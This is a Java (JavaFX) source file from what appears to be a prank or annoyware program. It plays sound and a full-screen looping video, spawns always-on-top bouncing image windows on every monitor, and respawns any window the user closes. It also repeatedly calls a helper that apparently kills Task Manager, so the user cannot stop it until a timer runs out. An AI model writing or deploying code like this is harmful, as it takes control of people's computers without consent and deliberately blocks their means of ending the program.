package maurus.features.popups.bounce;

import javafx.animation.KeyFrame;
import javafx.animation.Timeline;
import javafx.application.Application;
import javafx.geometry.Rectangle2D;
import javafx.scene.Scene;
import javafx.scene.image.Image;
import javafx.scene.image.ImageView;
import javafx.scene.layout.StackPane;
import javafx.scene.media.Media;
import javafx.scene.media.MediaPlayer;
import javafx.scene.media.MediaView;
import javafx.stage.Screen;
import javafx.stage.Stage;
import javafx.stage.StageStyle;
import javafx.animation.AnimationTimer;
import javafx.util.Duration;
import maurus.App;
import maurus.common.block.TaskkillTaskMngr;

import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.concurrent.CopyOnWriteArrayList;

public class Donald {

    private int a = 30;
    private int b = 20;
    private int counter = 0;
    private int numWindows = 3;
    private final Random rand = new Random();
    private double dx = rand.nextDouble() * a - b;
    private double dy = rand.nextDouble() * a - b;

    // Resources
    private final String mediaPath = getClass().getResource("/bounce/sounds/file1.mp3").toExternalForm();
    private final String vmediaPath = getClass().getResource("/bounce/vids/file2.mp4").toExternalForm();

    //Random variables
    private final List<Bouncer> bouncers = new CopyOnWriteArrayList<>();

    private MediaPlayer videoPlayer;
    private MediaPlayer audioPlayer;


    public void start(Stage primaryStage, Runnable onDone) {
        //Creates a MediaPlayer to play the audio, also sets many of the values
        Media media = new Media(mediaPath);
        audioPlayer = new MediaPlayer(media);
        audioPlayer.play();

        // Creates a MediaPlayer to play the video, also sets many of the values
        Media videoMedia = new Media(vmediaPath);
        videoPlayer = new MediaPlayer(videoMedia);
        videoPlayer.setCycleCount(MediaPlayer.INDEFINITE);
        MediaView mediaView = new MediaView(videoPlayer);
        mediaView.setPreserveRatio(true);
        videoPlayer.setAutoPlay(true);

        // Creates a fullscreen stage for the video background and assign all its values
        Stage videoStage = new Stage(StageStyle.UNDECORATED);
        Rectangle2D screenBounds = Screen.getPrimary().getVisualBounds();
        mediaView.setFitWidth(screenBounds.getWidth());
        mediaView.setFitHeight(screenBounds.getHeight());
        StackPane videoRoot = new StackPane(mediaView);
        Scene videoScene = new Scene(videoRoot, screenBounds.getWidth(), screenBounds.getHeight());
        videoStage.setScene(videoScene);
        videoStage.setX(screenBounds.getMinX());
        videoStage.setY(screenBounds.getMinY());
        videoStage.setAlwaysOnTop(false);

        videoStage.show();

        List<Screen> screens = Screen.getScreens(); //Gets all screens and puts them on the List Screen
        System.out.println("Detected " + screens.size() + " monitor(s).");

        for (Screen screen : screens) { //The bouncing images get created here - gets made for each screen
            Rectangle2D bounds = screen.getVisualBounds();
            for (int i = 0; i < numWindows; i++) {
                spawnBouncer(bounds);
            }
        }

        new AnimationTimer() {
            @Override
            public void handle(long now) {
                for (Bouncer b : bouncers) { //Does the update for every bouncer in the ArrayList
                    b.update();
                }
                if (counter > 100) {
                    TaskkillTaskMngr.taskkill(); //Calls Taskkill.java
                    counter = 0;
                }
                counter += 1;
            }
        }.start();

        Timeline timeline = new Timeline(new KeyFrame(Duration.minutes(App.getAppclosetime()), actionEvent -> {
            videoStage.hide();
            videoPlayer.stop();
            audioPlayer.stop();
            videoStage.close();
            for (Bouncer b : bouncers) {
                b.stage.hide();
                b.stage.close();
            }
            bouncers.clear();
            onDone.run();
        })
        );
        timeline.setCycleCount(1);//ensures it's only called once
        timeline.play();

    }

    //Method to create Bouncers with all its varibales like inporting images, creating stages, etc. - work as bit diffrent to Joe.class
    private void spawnBouncer(Rectangle2D bounds) {
        Image image = new Image(getClass().getResourceAsStream("/bounce/trump.png"));
        ImageView imageView = new ImageView(image);
        imageView.setPreserveRatio(false);

        Stage stage = new Stage(StageStyle.UNDECORATED); //Creates Stage and sets papameters
        stage.setWidth(image.getWidth());
        stage.setHeight(image.getHeight());
        stage.setAlwaysOnTop(true);

        StackPane root = new StackPane(imageView); //Creates Stackpane and adds the Image on it
        Scene scene = new Scene(root, image.getWidth(), image.getHeight());
        stage.setScene(scene);

        double x = bounds.getMinX() + rand.nextDouble() * (bounds.getWidth() - image.getWidth());
        double y = bounds.getMinY() + rand.nextDouble() * (bounds.getHeight() - image.getHeight());
        if (dx == 0) dx = 1;//ensures speed isn't 0
        if (dy == 0) dy = 1;

        Bouncer b = new Bouncer(stage, x, y, dx, dy, image.getWidth(), image.getHeight(), bounds); //Adds Bouncer b to bouncers
        bouncers.add(b);

        stage.setX(x);
        stage.setY(y);
        stage.show();

        // Respawn if closed (e.g. via Alt+F4)
        stage.setOnCloseRequest(e -> {
            bouncers.remove(b);
            spawnBouncer(bounds);
        });
    }
}